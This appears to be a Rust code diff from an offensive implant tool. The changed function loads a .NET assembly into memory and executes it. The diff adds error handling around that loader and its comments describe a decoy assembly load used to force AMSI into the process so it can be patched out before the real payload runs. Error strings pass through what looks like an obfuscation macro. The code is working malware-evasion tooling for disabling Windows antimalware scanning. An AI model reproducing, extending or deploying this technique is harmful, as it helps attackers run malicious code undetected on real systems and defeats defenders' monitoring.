@@ -35,6 +35,9 @@ pub enum DotnetError {
     AssemblyDataNull,
     SafeArrayNotInitialised,
     NoArgsInInput,
+    SafeArrayAccessUnaccessFail(i32),
+    BadEntrypoint(i32),
+    Load3Failed(i32),
 }
 
 impl DotnetError {
@@ -74,6 +77,24 @@ impl DotnetError {
                 )
             }
             DotnetError::NoArgsInInput => sc!("There were no arguments in the input.", 26).unwrap(),
+            DotnetError::SafeArrayAccessUnaccessFail(i) => {
+                format!(
+                    "{} {i:#X}",
+                    sc!("Could not access / unaccess a SAFEARRAY:", 73).unwrap()
+                )
+            }
+            DotnetError::BadEntrypoint(i) => {
+                format!(
+                    "{} {i:#X}",
+                    sc!("Could not get entrypoint of assembly:", 73).unwrap()
+                )
+            }
+            DotnetError::Load3Failed(i) => {
+                format!(
+                    "{} {i:#X}",
+                    sc!("Failed to load assembly into the process:", 73).unwrap()
+                )
+            }
         }
     }
 }
@@ -156,7 +177,7 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetErro
     let p_sa = create_safe_array(buf)?;
 
     // Create a junk decoy safe array such that we force a load of AMSI to then patch out
-    let decoy_buf = [0x00, 0x00, 0x00, 0x01];
+    let decoy_buf = [0x00, 0x00, 0x00, 0x00];
     let p_decoy_sa = create_safe_array(&decoy_buf)?;
 
     //
@@ -167,14 +188,18 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetErro
     let mut sp_assembly: *mut _Assembly = std::ptr::null_mut();
     let load_3 = unsafe { (*(*app_domain).vtable).Load_3 };
 
-    // Decoy
+    // Decoy - the result here is expected to be an error, so we dont want to check for this.
     let _res = unsafe { load_3(app_domain as *mut _, p_decoy_sa, &mut sp_assembly) };
 
+    // Now we can patch AMSI as it will have been loaded into the process by the above load_3
     patch_amsi_if_ft_flag();
 
-    // Reset assembly and load the assembly with AMSI patched
+    // Reset assembly data and load the assembly with AMSI patched
     sp_assembly = null_mut();
     let res = unsafe { load_3(app_domain as *mut _, p_sa, &mut sp_assembly) };
+    if res != 0 {
+        return Err(DotnetError::Load3Failed(res));
+    }
 
     if sp_assembly.is_null() {
         return Err(DotnetError::AssemblyDataNull);
@@ -184,8 +209,12 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetErro
     // Get the entrypoint of the assembly, should be Main?
     //
     let mut entryp = null_mut();
-    let h_result =
+    let res =
         unsafe { ((*(*sp_assembly).vtable).get_EntryPoint)(sp_assembly as *mut _, &mut entryp) };
+
+    if res != 0 {
+        return Err(DotnetError::BadEntrypoint(res));
+    }
 
     let mut retval = VARIANT::default();
     let object = VARIANT::default();
@@ -285,9 +314,16 @@ fn create_safe_array(buf: &[u8]) -> Result<*mut SAFEARRAY, DotnetError> {
     }
 
     let mut p_data = null_mut();
-    let todo = unsafe { SafeArrayAccessData(p_sa, &mut p_data) };
+    let res = unsafe { SafeArrayAccessData(p_sa, &mut p_data) };
+    if res != 0 {
+        return Err(DotnetError::SafeArrayAccessUnaccessFail(res));
+    }
+
     unsafe { std::ptr::copy_nonoverlapping(buf.as_ptr(), p_data as *mut u8, buf.len()) };
-    let todo = unsafe { SafeArrayUnaccessData(p_sa) };
+    let res = unsafe { SafeArrayUnaccessData(p_sa) };
+    if res != 0 {
+        return Err(DotnetError::SafeArrayAccessUnaccessFail(res));
+    }
 
     Ok(p_sa)
 }
